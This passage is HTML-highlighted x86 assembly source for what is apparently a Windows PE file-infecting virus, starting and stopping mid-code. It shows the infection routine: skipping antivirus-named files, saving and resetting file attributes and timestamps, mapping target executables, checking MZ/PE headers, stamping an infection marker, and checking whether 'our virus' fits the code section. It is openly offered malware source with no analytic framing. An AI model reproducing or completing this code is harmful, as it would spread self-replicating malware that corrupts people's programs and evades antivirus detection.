       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">extensions</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished_infection</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">re_do</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">finished_infection</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findhandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">extensions</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">findhandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                       </span><span class="sc1">;нsave regs</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ValidateName</span><span class="sc0">               </span><span class="sc1">;нvalidate the file</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">quit_infection</span><span class="sc0">               </span><span class="sc1">;нname (e.g. no AV)</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нsave file's attributes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fileattributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нset attributes to norm.</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нopen the file!</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckError</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">quit_infection</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;нsave handle</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filetime</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нsave the file time</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileTime</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нget the file size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileSize</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckError</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;нcalculate the memory</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">incrsize</span><span class="sc0">               </span><span class="sc1">;нsize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">memsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;нcreate a file mapping</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">memsize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нobject</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckError</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;нsave the map handle</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">memsize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нmap the file!</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckError</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_map</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;нsave the map address</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">            </span><span class="sc1">;нDos signature</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нget PEheader offset</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">                   </span><span class="sc1">;нcan we read?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_IsBadReadPtr</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_map</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">            </span><span class="sc1">;нPE file?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">data_area</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нour data area</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;нnow get and save</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;нall the needed data from</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NumberOfSections</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нthe PE headers</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;нalready infected?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'TH'</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_map</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TH'</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfCode</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_BaseOfCode</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">overdata</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">data_area</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;нusefull data...</span><span class="sc0">
       </span><span class="sc5">peheader</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">numberofsections</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">sizeofoptionalheader</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">optionalheader</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">sizeofcode</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">image_base</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">filealign</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">sectionalign</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">eip</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">baseofcode</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">sizeofimage</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">firstsection</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">codesection</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">lastsection</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc5">randomincr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">overdata</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">         </span><span class="sc1">;нour virus can fit the</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                   </span><span class="sc1">;нcode section?</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">image_base</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@500</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">locate_code_section</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;нlet's locate the code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нsection...</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseofcode</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_it</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">unmap_view</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_code_section</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
